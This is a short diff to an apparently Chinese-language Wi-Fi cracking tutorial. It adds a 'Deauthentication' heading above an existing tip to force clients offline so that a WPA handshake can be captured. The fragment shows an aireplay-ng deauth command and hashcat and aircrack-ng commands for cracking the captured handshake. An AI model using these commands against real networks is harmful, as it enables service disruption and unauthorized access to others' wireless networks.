@@ -76,6 +76,8 @@ hashcat -m 2500 wireless.hccap pass.txt --force                     # 用hashcat
 aircrack-ng wireless-01.cap -j wireless
 ```
 
+**Deauthentication**
+
 注意如果抓不到握手包把对方踢下线,这样就会抓包成功
 ```bash
 aireplay-ng -0 10 -a <无线路由器的MAC地址> -c <连接上的设备MAC地址> wlan0mon
